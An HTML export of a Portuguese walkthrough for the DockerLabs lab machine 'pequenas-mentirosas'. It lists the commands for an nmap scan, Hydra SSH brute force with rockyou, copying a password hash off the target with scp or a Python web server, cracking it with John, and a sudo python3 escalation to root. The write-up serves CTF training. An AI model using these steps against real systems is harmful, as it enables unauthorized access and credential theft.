<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>maq.pequenas-mentirosas</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>maq.pequenas-mentirosas</h1><br/><p></p><p><strong><span style="color:#ff0000;">MÁQUINA-MENTIROSAS</span></strong></p><p></p><p><img src="images/151-1.png" alt="images/151-1.png" /></p><p></p><p>Para utilizar esta máquina devemos primeiro baixar os arquivos e assim implantá-la com Docker.</p><p>  </p><p>Baixamos o arquivo da página <a href="https://dockerlabs.es/">https://dockerlabs.es/</a></p><p></p><p>Para implantar o laboratório executamos da seguinte forma, para que também possamos ver que ele nos diz a direção que teremos, bem como o que fazer quando terminarmos.</p><p></p><p><img src="images/151-2.png" alt="images/151-2.png" /></p><p></p><p><strong><span style="color:#ff0000;">COLETA DE INFORMAÇÕES </span></strong></p><p></p><p><strong><span style="color:#ff7800;">nmap 172.17.0.2 -A -sS -sV -sC -Pn -T5</span></strong></p><p></p><p><img src="images/151-3.png" alt="images/151-3.png" /></p><p></p><p><strong><span style="color:#ff0000;">portas abertas</span></strong><span style="color:#ff0000;">:</span></p><p></p><p><strong>22/tcp open  ssh     OpenSSH 9.2p1 Debian</strong><strong></strong></p><p><strong>80/tcp open  http    Apache httpd 2.4.62</strong></p><p></p><p><strong>Continuamos investigando mais sobre as portas e agora investigamos sobre o serviço HTTP . O endereço IP foi inserido no navegador o que levou o site a mencionar uma pista para nós e descobrimos que pode ser um usuário chamado </strong><strong><span style="color:#ff7800;">A. </span></strong></p><p></p><p><img src="images/151-4.png" alt="images/151-4.png" /></p><p></p><p><strong>vamos fazer um ataque de força bruta com </strong><strong><span style="color:#ff7800;">hydra</span></strong></p><p></p><p><strong><span style="color:#ff7800;">hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2:22</span></strong></p><p></p><p><img src="images/151-5.png" alt="images/151-5.png" /></p><p></p><p><strong>Ao realizar o ataque de força bruta, descobrimos a senha de um arquivo . Sabendo disso, nos conectamos via SSH ao usuário com o comando:</strong></p><p></p><p><strong><span style="color:#ff7800;">ssh a@172.17.2</span></strong></p><p></p><p><img src="images/151-6.png" alt="images/151-6.png" /></p><p></p><p><strong>Ao listar o conteúdo do diretório, não encontramos nenhum arquivo. É importante lembrar que os arquivos associados aos servidores são armazenados no formato </strong><strong><code><span style="color:#ff7800;">/srv</span></code></strong><strong>.</strong><strong></strong></p><p><strong></strong><img src="images/151-7.png" alt="images/151-7.png" /></p><p></p><p></p><p><strong>2 exemplos de baixar o arquivo para maquina da vitima.</strong></p><p></p><p><strong><span style="color:#ff0000;">exemplo 1°</span></strong></p><p></p><p><strong><span style="color:#ff7800;">scp a@172.17.0.2:/srv/ftp/hash_spencer.txt  .</span></strong></p><p></p><p><img src="images/151-8.png" alt="images/151-8.png" /></p><p></p><p><strong><span style="color:#ff0000;">exemplo 2°</span></strong></p><p></p><p><strong><span style="color:#ff7800;">python3 -m http.server</span></strong></p><p><img src="images/151-9.png" alt="images/151-9.png" /></p><p></p><p><img src="images/151-10.png" alt="images/151-10.png" /></p><p></p><p><strong>entramos no arquivo </strong><strong><span style="color:#ff7800;">hash_spencer.txt </span></strong><strong>e copiamos a hash com o mesmo nome na maquina atacante.</strong></p><p><img src="images/151-11.png" alt="images/151-11.png" /></p><p></p><p><strong>vamos quebrar essa hash  com </strong><strong><span style="color:#ff7800;">JOHN</span></strong></p><p></p><p><span style="color:#ff7800;">john --format=raw-md5 hash_spencer.txt </span></p><p></p><p><img src="images/151-12.png" alt="images/151-12.png" /></p><p></p><p><strong>UMA OUTRA MANEIRA DE DESCOBRIR A SENHA DO USUÁRIO </strong><strong><span style="color:#ff7800;">SPENCER,</span></strong><strong> E USAR O </strong><strong><span style="color:#ff7800;">HYDRA</span></strong></p><p></p><p><strong><span style="color:#ff7800;">hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2:22</span></strong></p><p><img src="images/151-13.png" alt="images/151-13.png" /></p><p></p><p><strong>exploração sudo -l </strong></p><p></p><p><strong>Foi identificado que podemos executar </strong><strong><code>/usr/bin/python3</code></strong><strong>com permissões </strong><strong><code>sudo</code></strong><strong>. Para escalar privilégios, usaremos </strong><strong><a href="https://gtfobins.github.io/gtfobins/python/">GTFObins</a></strong><strong> , que fornece uma lista de comandos que podem ser executados usando Python.</strong><strong></strong></p><p><strong>Isso nos permitirá aproveitar as vantagens do ambiente Python para executar código que nos ajuda a obter acesso a níveis mais elevados de privilégio no sistema.</strong></p><p></p><p><img src="images/151-14.png" alt="images/151-14.png" /></p><p></p><p><img src="images/151-15.png" alt="images/151-15.png" /></p><p></p><p><strong>podemos ver que no comando abaixo acrecentei python</strong><strong><span style="color:#ff7800;">3</span></strong><strong> e o /bin/</strong><strong><span style="color:#ff7800;">bash</span></strong></p><p></p><p><strong><span style="color:#ff7800;">sudo python3 -c &#39;import os; os.system(&quot;/bin/bash&quot;)&#39;</span></strong></p><p></p><p><img src="images/151-16.png" alt="images/151-16.png" /></p><p></p><p><strong><span style="color:#ff7800;">somos root</span></strong></p><p></p><p><strong><span style="color:#ff0000;text-decoration:line-through;">bobmarley</span></strong></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
